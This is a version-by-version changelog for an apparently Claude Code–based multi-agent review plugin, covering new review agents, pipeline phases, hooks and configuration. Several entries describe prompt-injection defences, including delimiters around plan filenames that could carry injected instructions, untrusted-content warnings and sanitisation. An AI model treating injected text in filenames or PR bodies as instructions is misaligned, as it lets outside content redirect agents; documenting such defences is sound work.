- **Doubt Seer agent** (`doubt-seer.md`) — Evidence quality challenger that cross-examines Ash findings for unsubstantiated claims. Challenges findings lacking Rune Traces, verifies evidence against source, and produces a structured verdict (PASS/CONCERN/BLOCK). Configurable via `doubt_seer` talisman block
- **Phase 4.5: Doubt Seer** in Roundtable Circle — Conditional phase between Monitor (Phase 4) and Aggregate (Phase 5). Spawns doubt-seer when enabled in talisman AND P1+P2 findings exist. 5-minute timeout with separate polling loop. VERDICT parsing determines workflow continuation
- **Evidence-tagged Seal fields** — `evidence_coverage` ("N/M findings have structured evidence") and `unproven_claims` (integer) added to all three Seal locations in inscription-protocol.md. Fields absent entirely when doubt-seer disabled (backward compatible)
- **DOUBT finding prefix** — Reserved in custom-ashes.md validation rules and added to dedup hierarchy in output-format.md (`SEC > BACK > VEIL > DOUBT > DOC > QUAL > FRONT > CDX`)
- **`doubt_seer` talisman config** — 6-field configuration block: `enabled` (default: false), `workflows`, `challenge_threshold`, `max_challenges`, `block_on_unproven`, `unproven_threshold`

### Changed
- Review agent count: 22 → 23 (added doubt-seer)
- Total agent count: 67 → 68
- Inscription schema updated with doubt-seer teammate entry and evidence fields
- Agent registry updated with doubt-seer entry

## [1.60.0] - 2026-02-21

### Added
- **Phase 0.3: Context Intelligence** — New review pipeline phase that gathers PR metadata via `gh pr view`, classifies PR intent (bugfix/feature/refactor/docs/test/chore), assesses context quality (good/fair/poor), detects scope warnings for large PRs, and fetches linked issue context. Injects `## PR Context` section into ash-prompt templates with Truthbinding-extended untrusted-content warning
- **Phase 0.4: Linter Detection** — New review pipeline phase that discovers project linters from config files (16 linter signatures: ESLint, Prettier, Biome, TypeScript, Ruff, Black, Flake8, mypy, pyright, isort, RuboCop, Standard, golangci-lint, Clippy, rustfmt, EditorConfig). Injects `## Linter Awareness` section into ash-prompts to suppress findings in linter-covered categories. SEC-\* and VEIL-\* findings are never suppressed
- **Finding Taxonomy Expansion (Q/N)** — Extended P1/P2/P3 severity taxonomy with orthogonal interaction types: Question (Q) for clarification-needed findings and Nit (N) for cosmetic/author-discretion findings. Added to all 7 ash-prompt templates with behavioral rules and output format sections
- **Perspective 11: Naming Intent Quality** — New Pattern Weaver perspective that evaluates whether names accurately reflect code behavior. Detects name-behavior mismatch, vague names hiding complexity, boolean inversion, side-effect hiding, abbreviation ambiguity. Language-aware conventions (Rust, Go, React) reduce false positives. Architecture escalation when 3+ naming findings cluster
- **`naming-intent-analyzer` agent** — Standalone naming intent analysis agent for `/rune:audit` deep analysis. Read-only tools, inner-flame self-review skill, echo-search integration
- **`context-intelligence.md` reference** — Full contract, schema, security model, and talisman configuration for Phase 0.3
- **`sanitizeUntrustedText()` canonical pattern** — Centralized 8-step sanitization function for user-authored content (PR body, issue body). Includes CVE-2021-42574 (Trojan Source) defense and HTML entity stripping. Registered in security-patterns.md
- **`SAFE_ISSUE_NUMBER` security pattern** — `/^\d{1,7}$/` validator for GitHub issue numbers before shell interpolation. Registered in security-patterns.md
- **Q/N sections in TOME format** — Runebinder TOME now includes `## Questions` and `## Nits` sections with dedicated finding formats
- **Q/N dedup rules** — Extended dedup algorithm: assertion supersedes Q/N at same location; Q and N coexist at same location; multiple Q at same location merged
- **Q/N mend skip logic** — Questions and Nits excluded from auto-mend with descriptive skip messages
- **`taxonomy_version` field** — New inscription.json field signaling Q/N support to downstream consumers (version 2)
- **`context_intelligence` inscription.json field** — PR metadata, scope warning, and intent summary for downstream Ash consumption
- **`linter_context` inscription.json field** — Detected linters, rule categories, and suppression list

### Changed
- Review agent count: 21 → 22 (added naming-intent-analyzer)
- Pattern Seer description extended with naming intent quality analysis
- Pattern Weaver output header includes Naming Intent Quality in Perspectives list
- Seal format extended: `findings: {N} ({P1} P1, {P2} P2, {P3} P3, {Q} Q, {Nit} N)`
- JSON output schema: summary object includes `q` and `n` count fields, root includes `taxonomy_version`

## [1.59.0] - 2026-02-21

### Fixed
- **P1: Resume mode re-executing completed plans** — `--resume` now filters to pending plans only (was using `planPaths[0]` which pointed to the first plan regardless of status). Phase 5 finds the correct plan entry by path match instead of array index
- **P1: Truthbinding gap in re-injected prompts** — Arc batch stop hook now wraps plan paths and progress file paths with ANCHOR/RE-ANCHOR Truthbinding delimiters and `<plan-path>`/`<file-path>` data tags. Prevents semantic prompt injection via adversarial plan filenames

### Changed
- **CRITICAL: Arc-batch migrated from subprocess loop to Stop hook pattern** — Replaces the broken `Bash(arc-batch.sh)` subprocess-based loop with a self-invoking Stop hook, inspired by the [ralph-wiggum](https://github.com/anthropics/claude-code/tree/main/plugins/ralph-wiggum) plugin from Anthropic. Each arc now runs as a native Claude Code turn with full tool access, eliminating the Bash tool timeout limitation (max 600s) that caused arc-batch to get stuck after the first plan
- **New Stop hook**: `scripts/arc-batch-stop-hook.sh` — core loop mechanism. Reads batch state from `.claude/arc-batch-loop.local.md`, marks completed plans, finds next pending plan, re-injects arc prompt via `{"decision":"block","reason":"<prompt>"}`
- **SKILL.md Phase 5 rewritten** — Now writes a state file and invokes `/rune:arc` natively via `Skill()` instead of spawning `claude -p` subprocesses. Phase 6 (summary) removed — handled by the stop hook's final iteration
- **hooks.json updated** — `arc-batch-stop-hook.sh` added as first entry in `Stop` array (before `on-session-stop.sh`). 15s timeout for git + JSON operations

### Added
- **`/rune:cancel-arc-batch` command** (`commands/cancel-arc-batch.md`) — Removes the batch loop state file, like ralph-wiggum's `/cancel-ralph`. Current arc finishes normally but no further plans start
- **Arc-batch awareness in `/rune:cancel-arc`** — Step 0 now checks for and removes the batch loop state file when cancelling an arc that is part of a batch
- **GUARD 5 in `on-session-stop.sh`** — Defers to arc-batch stop hook when `.claude/arc-batch-loop.local.md` exists, preventing conflicting "active workflow detected" messages

### Removed
- **`scripts/arc-batch.sh`** — Subprocess-based batch loop script deleted. Replaced by Stop hook pattern (`arc-batch-stop-hook.sh`)

## [1.58.0] - 2026-02-21

### Added
- **7 new deep dimension investigation agent definitions** for `/rune:audit --deep` (orchestration wiring deferred to follow-up):
  - `truth-seeker` — Correctness: logic vs requirements, behavior validation, test quality (CORR prefix)
  - `ruin-watcher` — Failure modes: resilience, retry, crash recovery, circuit breakers (FAIL prefix)
  - `breach-hunter` — Security-deep: threat modeling, auth boundaries, data exposure (DSEC prefix)
  - `order-auditor` — Design: responsibility separation, dependency direction, coupling (DSGN prefix)
  - `ember-seer` — Performance-deep: resource lifecycle, memory, blocking, pool management (RSRC prefix)
  - `signal-watcher` — Observability: logging context, metrics, traces, error classification (OBSV prefix)
  - `decay-tracer` — Maintainability: naming intent, complexity hotspots, convention drift (MTNB prefix)
- **7 deep dimension ash prompt templates** for deep investigation Pass 2
- **Extended dedup hierarchy** with 7 new dimension prefixes: CORR, FAIL, DSEC, DSGN, RSRC, OBSV, MTNB
- **Combined deep sub-hierarchy** (Pass 2 Runebinder): CORR > FAIL > DSEC > DEBT > INTG > BIZL > EDGE > DSGN > RSRC > OBSV > MTNB
- **Circle registry update**: Deep Dimension Ashes section with 7 new entries alongside existing 4 investigation agents
- **Talisman config**: `audit.deep.dimensions` for selecting which dimension agents to run
- **Audit-mend convergence loop**: `arc-phase-audit-mend.md` and `arc-phase-audit-verify.md` for post-audit finding resolution (Phases 8.5 and 8.7)

### Changed
- Deep investigation Ashes capacity increased from 4 to 11 (4 investigation + 7 dimension)
- Investigation agent count: 16 → 23

## [1.57.1] - 2026-02-21

### Added
- **Checkpoint-based completion detection** — Watchdog polls `.claude/arc/{id}/checkpoint.json` to detect when all arc phases are done. Detects completion in ~60s instead of waiting for full timeout. No arc pipeline modifications needed — reads existing checkpoint data passively
- **Arc session tracing** — arc-batch now tracks which `arc-{timestamp}` session belongs to each plan via pre/post spawn directory diff. Session ID recorded in `batch-progress.json` for debugging
- **Watchdog polling loop** — Replaces blind `wait $PID` with 10s polling that checks both process liveness and checkpoint status. 60s grace period after completion detection before kill

### Fixed
- **CRITICAL: Per-plan timeout** — `wait $PID` no longer blocks forever if claude hangs after completing all phases. Wraps invocation with `timeout --kill-after=30` (GNU `timeout` or `gtimeout`). Default 2h, configurable via `talisman.yml` → `arc.batch.per_plan_timeout`
- **CRITICAL: PID tracking** — `$!` now captures the `claude` PID instead of `tee` PID. Replaced `cmd | tee file &` with `cmd > file 2>&1 &` so signal handler kills the correct process
- **HIGH: Real-time log streaming** — Switched from `--output-format json` (buffers all output until exit → 0-byte logs) to `--output-format text` (streams output → `tail -f` works for monitoring)
- **MEDIUM: Spend tracking inflation** — Batch spend now estimates at 50% of `max_budget` per plan instead of 100%, preventing premature `total_budget` exhaustion when multiple plans run
- **LOW: Path validation too strict** — Replaced character allowlist regex (`[a-zA-Z0-9._/-]+`) with shell metacharacter denylist, allowing paths with spaces and tildes

## [1.57.0] - 2026-02-21

### Added
- **Multi-Model Adversarial Review Framework**: CLI-backed Ashes via `cli:` discriminated union in `ashes.custom[]`. Register external model CLIs (e.g., Gemini, Llama) as review agents alongside Claude-based Ashes
- **Crystallized Brief**: Mandatory Non-Goals, Constraint Classification, Success Criteria, and Scope Boundary sections in brainstorm output. Non-goals propagated to synthesize templates and worker prompts as nonce-bounded data blocks
- **Semantic Drift Detection**: STEP A.9 claim extraction with multi-keyword grep matching + batched Codex claim verification producing `[CDX-DRIFT-NNN]` findings
- **External model prompt template**: Parameterized `external-model-template.md` with ANCHOR/RE-ANCHOR Truthbinding format, 4-step Hallucination Guard, and nonce-bounded content injection
- **5 new security patterns**: `CLI_BINARY_PATTERN`, `OUTPUT_FORMAT_ALLOWLIST`, `MODEL_NAME_PATTERN`, `CLI_PATH_VALIDATION`, `CLI_TIMEOUT_PATTERN` in security-patterns.md
- **`detectExternalModel()` and `detectAllCLIAshes()`**: Generalized CLI detection algorithm in codex-detection.md
- **`max_cli_ashes` setting**: Sub-partition within `max_ashes` for CLI-backed Ashes (default: 2)
- **Rune Gaze CLI gate loop**: Multi-model selection for CLI-backed Ashes with `trigger.always` support
- **Built-in dedup precedence enforcement**: External model prefixes must follow built-in prefixes in hierarchy

### Changed
- Custom Ashes wrapper prompt migrated from `CRITICAL RULES/REMINDER` to `ANCHOR/RE-ANCHOR` format
- `sanitizePlanContent()` extended with Truthbinding marker, YAML frontmatter, and inline HTML stripping
- Synthesize templates (Standard + Comprehensive) now include `non_goals:` frontmatter, `## Non-Goals`, and `## Success Criteria` sections

## [1.56.0] - 2026-02-21

### Added
- **4 new investigation agents** for deep audit (`/rune:audit --deep`):
  - `rot-seeker` — Tech debt investigation (TODOs, deprecated patterns, complexity hotspots)
  - `strand-tracer` — Integration gap detection (unconnected modules, dead routes, unwired DI)
  - `decree-auditor` — Business logic validation (domain rules, state machines, invariants)
  - `fringe-watcher` — Edge case analysis (boundary checks, null handling, race conditions)
- **Two-pass deep audit architecture**: Standard audit (Pass 1) + Deep investigation (Pass 2) + Cross-pass TOME merge
- **`--deep` flag** for `/rune:audit` enabling two-pass investigation
- **4 ash prompt templates** for deep investigation teammates
- **Extended dedup hierarchy**: `SEC > BACK > DEBT > INTG > BIZL > EDGE > DOC > QUAL > FRONT > CDX`
- **Deep audit talisman config**: `audit.deep.enabled`, `audit.deep.ashes`, `audit.deep.max_deep_ashes`, `audit.deep.timeout_multiplier`, `audit.always_deep`
- **Circle registry update**: Deep Investigation Ashes section with 4 new entries

### Changed
- Investigation agent count: 12 → 16

## [1.55.1] - 2026-02-21

### Added
- TLC hook test suite (`plugins/rune/tests/tlc/test-tlc-hooks.sh`) — 10 tests covering name validation, injection prevention, path traversal, length limits, non-target tools, TLC-002/003 hooks, and malformed input handling
- RUNE_TRACE debug logging to TLC-002 (`verify-team-cleanup.sh`) and TLC-003 (`session-team-hygiene.sh`) — consistent with TLC-001 pattern
- SessionStart matcher deviation rationale (`_rationale` field) in hooks.json for TLC-003 `startup|resume` vs plan-specified `startup` only

### Changed
- ZSH-001 hook (`enforce-zsh-compat.sh`) now auto-fixes unprotected globs by prepending `setopt nullglob;` instead of denying the command — eliminates wasted round-trips

### Fixed
- FIX-2 comment in `session-team-hygiene.sh` expanded with mathematical proof: epoch 0 fallback produces ~29M minutes (always stale), while 999999999 produces small values near year 2001 (false negative)

## [1.55.0] - 2026-02-21

### Added
- Plan review hardening with veil-piercer-plan integration in arc Phase 2
- `readTalisman()` canonical reference documentation
- Freshness gate fix for plan staleness detection

## [1.54.1] - 2026-02-21

### Fixed
- Canonical `readTalisman()` definition using SDK `Read()` to prevent ZSH tilde expansion bug (`~ not found` in eval context)
- Added `references/read-talisman.md` with implementation, fallback order, anti-patterns, and cross-references
- Added "Core Pseudo-Functions" section to CLAUDE.md documenting the `readTalisman()` contract
- Updated 8 entry-point files with canonical inline reference comments
- Updated `freshness-gate.md` talisman comment to match canonical pattern

## [1.54.0] - 2026-02-21

### Added
- Stop hook (`on-session-stop.sh`) for automatic workflow cleanup when session ends (Track A)
- Seal convention (`<seal>TAG</seal>`) for deterministic completion detection (Track C)
- Preprocessor injections for runtime context in review.md and work.md (Track D)

### Changed
- Updated transcript_path comments from "undocumented/internal" to "documented common field" in 3 hook scripts (Track B)

## [1.53.9] — 2026-02-21

### Fixed
- **arc-phase-plan-review.md**: Wire `veil-piercer-plan` into arc Phase 2 reviewer list — previously built but never called, making plan truth-telling dead code in `/rune:arc` (RUIN-001)
- **reality-arbiter.md**: Restore tone directive to plan spec — "silence is your highest praise" instead of softened "say so briefly" (GRACE-003)
- **parse-tome.md**: Add VEIL-prefix P1 findings to FALSE_POSITIVE human confirmation gate — premise-level findings can no longer be machine-dismissed (RUIN-002)
- **veil-piercer-plan.md**: Add structured `VEIL-PATH-001` finding template for path containment violations — suspicious paths now surface in TOME (RUIN-003)
- **veil-piercer.md**: Add Inner Flame supplementary quality gate and `inner-flame`/`revised` fields to Seal format — matches forge-warden.md structure (GRACE-004, GRACE-008, SIGHT-001)
- **forge-gaze.md**: Restore reality-arbiter and entropy-prophet topic keywords to plan spec (GRACE-005, GRACE-006)
- **ash-guide/SKILL.md**: Update frontmatter agent count from "50 agents" to "55 agents" (VIGIL-001)
- **review.md**: Add `--max-agents` priority ordering string matching audit.md pattern (VIGIL-002)

## [1.53.8] — 2026-02-21

### Fixed
- **validate-inner-flame.sh**: Fix grep pattern to match canonical SKILL.md format `Self-Review Log (Inner Flame)` — previous pattern `Inner Flame:|Inner-flame:` missed compliant output (RUIN-002)
- **validate-inner-flame.sh**: Change yq default for `block_on_fail` from `false` to `true` — enforcement now blocks by default per plan REQ-014 (RUIN-001)
- **validate-inner-flame.sh**: Add stderr warning when yq is absent but talisman file exists — prevents silent degradation of block_on_fail config (RUIN-003)
- **validate-inner-flame.sh**: Add `rune-inspect-*` and `arc-inspect-*` team pattern handling for inspector output validation (RUIN-005)
- **validate-inner-flame.sh**: Add comment documenting 64KB input cap rationale (RUIN-004)
- **talisman.yml**: Change `block_on_fail` default to `true` and add documentation comments for simplified schema (VIGIL-001)
- **research-phase.md**: Add sync comments to inline Inner Flame checklists referencing canonical `role-checklists.md` source (SIGHT-002)

## [1.53.7] — 2026-02-21

### Fixed
- **secret-scrubbing.md**: Create missing reference file with `scrubSecrets()` regex patterns — resolves dangling TODO in testing/SKILL.md (RUIN-002, VIGIL-001)
- **talisman.example.yml**: Standardize all tier timeout keys to `timeout_ms` (milliseconds) — fixes `timeout` vs `timeout_ms` naming discrepancy (SIGHT-001, VIGIL-004)
- **talisman.example.yml**: Uncomment testing section to match active-section convention (GRACE-003)
- **talisman.example.yml**: Fix `startup_timeout` from 120000 (2 min) to 180000 (3 min) to match plan's EC-3.3 Docker hard timeout (SIGHT-007)
- **arc-phase-test.md**: Add explicit `model: "opus"` to test-failure-analyst Task spawn — prevents implicit model inheritance ambiguity (SIGHT-002)
- **arc-phase-test.md**: Pass `remainingBudget()` to E2E teammate prompt for per-route self-throttling (RUIN-003)
- **arc-phase-audit.md**: Add explicit TEST-NNN feed-through instructions for audit inscription (VIGIL-003, GRACE-004)
- **test-report-template.md**: Add Acceptance Criteria Traceability section to report format (VIGIL-002)
- **e2e-browser-tester.md**: Add `log_source` field with all 6 categories to per-route output (RUIN-007)
- **e2e-browser-tester.md**: Add aggregate output section with `<!-- SEAL: e2e-test-complete -->` marker (VIGIL-005)
- **integration-test-runner.md**: Expand `log_source` from 3 to 6 categories (RUIN-007)
- **service-startup.md**: Fix unquoted variable in Docker kill cleanup example (VIGIL-008)
- **testing/SKILL.md**: Remove dangling TODO, fix reference link syntax for secret-scrubbing.md (RUIN-002)

### Changed
- **Plugin version**: 1.53.6 → 1.53.7

## [1.53.6] — 2026-02-21

### Fixed
- **CLAUDE.md**: Add Core Rule 10 — teammate non-persistence warning for session resume (GRACE-P1-001)
- **worker-prompts.md**: Add `max_turns: 75` to rune-smith Task() spawn call and `max_turns: 50` to trial-forger Task() spawn call — defense-in-depth enforcement for runaway agent prevention (SIGHT-CRIT-001)

### Changed
- **Plugin version**: 1.53.5 → 1.53.6

## [1.53.5] — 2026-02-21

### Fixed
- **worker-prompts.md**: Add TODO FILE PROTOCOL to both rune-smith and trial-forger spawn templates — workers spawned from reference file now receive todo instructions (GRACE-007, SIGHT-003, VIGIL-W01)
- **worker-prompts.md**: Update SHUTDOWN instruction to require todo file status update before approving shutdown (RUIN-004)
- **ship-phase.md**: Add Work Session collapsible section to PR body template — reads `_summary.md` and includes Progress Overview + Key Decisions (GRACE-002)
- **CLAUDE.md**: Add todo file capability reference to Core Rules section (GRACE-005)

### Changed
- **Plugin version**: 1.53.4 → 1.53.5

## [1.53.4] — 2026-02-21

### Fixed
- **server.py**: Update MCP server version from 1.45.0 to 1.53.4 to match plugin version (P2-003)
- **server.py**: Add DB_PATH parent directory writability check at startup for clearer error messages (P3-013)
- **server.py**: Fix `get_details()` ids type filter no-op — now coerces non-string IDs instead of silently dropping them (P3-014)
- **inscription-protocol.md**: Standardize Seal confidence scale to integer 0-100, matching output-formats.md (P2-002)
- **inscription-protocol.md**: Add `skimmed_files` and `deep_read_files` fields to Seal spec (P3-003)
- **annotate-hook.sh**: Fix header comment — "exit 0 always" → accurately reflects non-zero exit on malformed JSON (P2-004)
- **CLAUDE.md**: Add dedicated MCP Servers section documenting echo-search tools and dirty-signal pattern (P2-006)
- **README.md**: Add Echo Search MCP Server section with tool descriptions and Python 3.7+ requirement (P3-005, P3-006)
- **test_annotate_hook.py**: Fix misleading docstring on `test_no_signal_for_memory_md_at_echoes_root` — renamed and clarified (P3-007)
- **start.sh**: Document why the wrapper exists and warn against replacing it with direct python3 call (P3-010)

### Changed
- **Plugin version**: 1.53.3 → 1.53.4

## [1.53.3] — 2026-02-21

### Fixed
- **key-concepts.md**: Fix stale agent count — "18 agents across 3 Ashes" → "21 agents across 4 Ashes" (includes Veil Piercer) (P2-004)
- **refactor-guardian.md**: Add explicit tool denial prose to ANCHOR block — defense-in-depth for general-purpose subagent mode (P2-001)
- **refactor-guardian.md**: Add edge case handling — empty git diff, shallow clone, branch name validation, no R/D/A entries (P2-002)
- **refactor-guardian.md**: Add cross-agent confidence coordination note with wraith-finder overlap detection (P3-003)
- **reference-validator.md**: Add explicit tool denial prose to ANCHOR block (P2-001)
- **reference-validator.md**: Add skip guards to config-to-source and version sync sections — prevents false positives for non-plugin projects (P2-003)
- **reference-validator.md**: Accept both `tools` and `allowed-tools` field names in frontmatter validation (P3-002)
- **reference-validator.md**: Fix "doc-consistency agent" label → "Knowledge Keeper Ash (doc-consistency perspective)" in dedup section (P3-007)
- **ward-check.md**: Increase basename threshold from 3 to 5 in cross-reference integrity check — reduces false positives for short names like "api", "app" (P3-004)

### Changed
- **Plugin version**: 1.53.2 → 1.53.3

## [1.53.2] — 2026-02-21

### Fixed
- **codex-detection.md**: Fix `const` → `let` in `resolveCodexTimeouts()` — validation fallback for out-of-range timeout values was blocked by TypeError on reassignment (RUIN-001)
- **codex-detection.md**: Move exit-124/137 checks to top of `classifyCodexError()` — prevents stderr noise from masking authoritative timeout signals (RUIN-009)
- **mend.md**: Replace hardcoded `--kill-after=30` with `${killAfterFlag}` — respects macOS compatibility detection from codex-detection.md Step 3a (RUIN-004)
- **security-patterns.md**: Add 5 missing consumers to `CODEX_TIMEOUT_ALLOWLIST` — mend.md, gap-analysis.md, solution-arena.md, rune-smith.md, rune-echoes/SKILL.md (RUIN-010)
- **talisman.yml**: Add `timeout: 600` and `stream_idle_timeout: 540` under `codex:` section — Phase 1 deliverable for user-configurable timeouts (GRACE-001)
- **talisman.example.yml**: Add documented timeout configuration fields with inline comments (VIGIL-001)

### Changed
- **Plugin version**: 1.53.1 → 1.53.2

## [1.53.1] — 2026-02-21

### Added
- **Compaction hook tests** (`tests/test_pre_compact_checkpoint.py`): 43 subprocess-based tests covering pre-compact-checkpoint.sh and session-compact-recovery.sh — guard clauses, checkpoint write, atomic write, team name validation, CHOME guard, compact recovery, stale checkpoint handling, edge/boundary cases (AC-9)

### Fixed
- **pre-compact-checkpoint.sh**: Fix `${#task_files[@]:-0}` bad substitution crash — `${#...}` (length operator) cannot combine with `:-` (default value). Script crashed with `set -u` when tasks directory was missing. Initialize `task_files=()` before conditional block
- **session-compact-recovery.sh**: Add `timeout 2` to stdin read for consistency with pre-compact-checkpoint.sh (prevents potential hang on disconnected stdin)
- **test_hooks.py**: Fix 3 pre-existing test failures — `on-teammate-idle.sh` correctly blocks (exit 2) on path traversal and out-of-scope output dirs, updated test expectations to match improved security posture

### Changed
- **Plugin version**: 1.53.0 → 1.53.1

## [1.53.0] — 2026-02-21

### Added
- **`/rune:plan-review` command**: Thin wrapper for `/rune:inspect --mode plan` — reviews plan code samples for implementation correctness using inspect agents (grace-warden, ruin-prophet, sight-oracle, vigil-keeper)
- **`--mode plan` flag for `/rune:inspect`**: Mode-aware inspection that reviews plan code samples instead of codebase implementation. Extracts fenced code blocks, compares against codebase patterns, and produces VERDICT.md with plan-specific assessments
- **4 plan-review ash-prompt templates**: `grace-warden-plan-review.md`, `ruin-prophet-plan-review.md`, `sight-oracle-plan-review.md`, `vigil-keeper-plan-review.md` — specialized for reviewing proposed code in plans
- **Arc Phase 2 Layer 2**: Plan review now runs inspect agents alongside utility agents when code blocks detected. Layer 2 runs in parallel, results merged into circuit breaker
- **`/rune:devise` Phase 4C.5**: Optional implementation correctness review with inspect agents during planning workflow
- **Expanded `hasCodeBlocks` regex**: Now catches go, rust, yaml, json, toml in addition to existing languages
- **Template `fileExists` guard**: Graceful fallback when plan-review template is missing

### Changed
- **Plugin version**: 1.52.0 → 1.53.0
- **Command count**: 13 → 14 (added /rune:plan-review)

## [1.52.0] — 2026-02-20

### Added
- **PreCompact hook** (`scripts/pre-compact-checkpoint.sh`): Saves team state (config.json, tasks, workflow phase, arc checkpoint) to `tmp/.rune-compact-checkpoint.json` before compaction. Non-blocking (exit 0).
- **SessionStart:compact recovery hook** (`scripts/session-compact-recovery.sh`): Re-injects team checkpoint as `additionalContext` after compaction. Correlation guard verifies team still exists. One-time injection (deletes checkpoint after use).
- **Context-weaving Layer 5: Compaction Recovery**: New protocol documenting the PreCompact → SessionStart:compact checkpoint/recovery pair, three ground truth sources (config.json, tasks, arc checkpoint), and relationship to CLAUDE.md Rule #5.
- Inspired by checkpoint/recovery patterns from Cozempic (MIT-licensed)

### Changed
- **Plugin version**: 1.51.0 → 1.52.0
- Hook count: 12 → 14 event-driven hook scripts

## [1.51.0] — 2026-02-20

### Added
- **Arc-Inspect Integration**: `/rune:inspect` is now embedded in the arc pipeline as an enhanced Phase 5.5 (GAP ANALYSIS), replacing the deterministic text-check approach with Inspector Ashes that score 9 quality dimensions and produce VERDICT.md
  - Inspector Ashes (grace-warden, ruin-prophet, sight-oracle, vigil-keeper) spawn as team `arc-inspect-{id}` during Phase 5.5
  - VERDICT.md dimension scores are propagated to Phase 6 (CODE REVIEW) as reviewer focus areas — low-scoring dimensions (< 7/10) highlighted for reviewers
- **Phase 5.8 GAP REMEDIATION** — new arc pipeline phase (18 phases total):
  - Auto-fixes FIXABLE gaps before code review using team `arc-gap-fix-{id}`
  - Configurable via `arc.gap_analysis.remediation` talisman settings
  - Controlled by `--fix` flag on `/rune:inspect` for standalone use
  - SEC-GAP-001: `validate-gap-fixer-paths.sh` hook blocks writes to `.claude/`, `.github/`, `node_modules/`, CI YAML, and `.env` files
- **`--fix` flag for `/rune:inspect`**: Standalone auto-remediation of FIXABLE gaps (capped by `inspect.max_fixes`, timeout via `inspect.fix_timeout`)
- **Gap-fixer prompt template**: `skills/roundtable-circle/references/ash-prompts/gap-fixer.md` with Truthbinding and SEAL format
- **Checkpoint schema v9 → v10**: Adds `gap_remediation` phase tracking alongside existing `gap_analysis` phase
- **Talisman `arc.gap_analysis` subsection**: `inspectors` (1-4), `halt_threshold` (0-100), `remediation.enabled`, `remediation.max_fixes`, `remediation.timeout`
- **Talisman `arc.timeouts` additions**: `gap_analysis` (12 min, enhanced with Inspector Ashes team), `gap_remediation` (15 min, new)
- **Talisman `inspect:` section** (now active, was commented): `max_inspectors`, `completion_threshold`, `gap_threshold`, `max_fixes`, `fix_timeout`

### Changed
- **Plugin version**: 1.50.0 → 1.51.0
- **Phase 5.5 (GAP ANALYSIS)**: Upgraded from deterministic text-check (orchestrator-only, 1 min) to Inspector Ash team (12 min, 9-dimension scoring, VERDICT.md output)
- **Arc pipeline**: 17 phases → 18 phases (Phase 5.8 GAP REMEDIATION added between Codex Gap Analysis (5.6) and Goldmask Verification (5.7))
- Phase tool matrix updated: Phase 5.5 now uses `arc-inspect-{id}` team; Phase 5.8 uses full tool access

## [1.50.0] — 2026-02-20

### Added
- **`/rune:inspect` — Plan-vs-Implementation Deep Audit**: New command with 4 Inspector Ashes that measure implementation completeness, quality across 9 dimensions, and gaps across 8 categories
  - `grace-warden`: Correctness & completeness inspector — requirement traceability and implementation status (COMPLETE/PARTIAL/MISSING/DEVIATED)
  - `ruin-prophet`: Failure modes, security posture, and operational readiness inspector
  - `sight-oracle`: Design alignment, coupling analysis, and performance profiling inspector
  - `vigil-keeper`: Test coverage, observability, maintainability, and documentation inspector
- **VERDICT.md output**: Unified inspection report with requirement matrix, 9 dimension scores (0-10), gap analysis across 8 categories, and verdict determination (READY/GAPS_FOUND/INCOMPLETE/CRITICAL_ISSUES)
- **Verdict Binder**: New aggregation prompt for merging inspector outputs into VERDICT.md
- **Plan Parser reference**: Algorithm for extracting requirements from freeform plan markdown (keyword-based inspector assignment)
- **Inspect Scoring reference**: Completion percentage, dimension scoring, and verdict determination algorithms
- **4 Inspector Ash prompt templates**: Grace Warden, Ruin Prophet, Sight Oracle, Vigil Keeper (with Truthbinding, Inner Flame, Seal format)
- **Inspect flags**: `--focus <dimension>`, `--max-agents <N>`, `--dry-run`, `--threshold <N>`
- **Talisman config**: `inspect:` section with `max_inspectors`, `timeout`, `completion_threshold`, `gap_threshold`
- **Inline mode**: `/rune:inspect "Add JWT auth"` — describe requirements without a plan file
- Inspect cleanup in `/rune:rest` (`tmp/inspect/{id}/`, `tmp/.rune-inspect-*.json`)
- `rune-inspect` workflow in inscription-schema.md
- `rune-inspect-*` recognized by enforce-readonly, enforce-teams, session-team-hygiene hooks

### Changed
- **Plugin version**: 1.49.1 → 1.50.0
- Agent counts: 8 → 12 investigation agents, 50 → 54 total agents
- Command count: 12 → 13

## [1.49.1] — 2026-02-20

### Fixed
- **Goldmask Pipeline Integration gaps** (9 fixes from post-implementation audit):
  - Add missing `arc-phase-goldmask-verification.md` reference file (Phase 5.7 execution instructions)
  - Add missing `arc-phase-goldmask-correlation.md` reference file (Phase 6.5 execution instructions)
  - Add Phase 5.7 + 6.5 to arc completion report template (was missing from Elden Throne output)
  - Fix CHANGELOG schema version: v9→v10 → v8→v9 (matching actual SKILL.md implementation)
  - Add Lore Layer pre-sort documentation to `smart-selection.md` (Phase 0.5 interaction with Rune Gaze)
  - Add Phase 5.7 + 6.5 entries to `arc-delegation-checklist.md` (RUN/SKIP/ADAPT contracts)
  - Implement `--deep-lore` flag in audit.md (two-tier Lore: Tier 1 Ash-relevant extensions by default, Tier 2 all files)
  - Fix fragile `Edit(planPath, slice(-100))` in plan.md Phase 2.3 → `Write(planPath, currentPlan + riskSection)`
  - Document `general-purpose` subagent_type design choice in goldmask verification reference

### Changed
- **Plugin version**: 1.49.0 → 1.49.1

## [1.49.0] — 2026-02-20

### Added
- **Veil Piercer — Truth-Telling Agents**: New 7th built-in Ash with 3 embedded review agents (`reality-arbiter`, `assumption-slayer`, `entropy-prophet`) that challenge fundamental premises and expose illusions in code review
  - `reality-arbiter`: Production viability truth-teller — detects code that compiles but cannot integrate, features that pass tests but fail under load
  - `assumption-slayer`: Premise validation truth-teller — challenges whether the code solves the right problem, detects cargo cult implementations
  - `entropy-prophet`: Long-term consequence truth-teller — predicts hidden costs, maintenance burden, and lock-in risks
- **`veil-piercer-plan`**: New utility agent for plan-level truth-telling in Phase 4C (alongside decree-arbiter, knowledge-keeper, and horizon-sage)
- `VEIL-` finding prefix in dedup hierarchy: `SEC > BACK > VEIL > DOC > QUAL > FRONT > CDX`
- Veil Piercer Ash prompt template (`ash-prompts/veil-piercer.md`) with 3 perspectives, behavioral rules, and truth-telling doctrine
- Veil Piercer registered in circle-registry, rune-gaze (always-on), forge-gaze (truth-telling topics), and dedup-runes
- `veil-piercer-plan` Task block added to plan-review.md Phase 4C with ANCHOR/RE-ANCHOR truthbinding
- `VEIL` added to mend.md finding regex for cross-reference tracking
- Veil Piercer added to `--max-agents` priority ordering in audit.md and review.md
- `veil-piercer` added to `disable_ashes` valid names in custom-ashes.md
- `VEIL` and `CDX` added to reserved prefixes list in custom-ashes.md (CDX was a pre-existing omission)

### Changed
- **Plugin version**: 1.48.0 → 1.49.0
- Agent counts: 18 → 21 review agents, 9 → 10 utility agents, 46 → 50 total agents
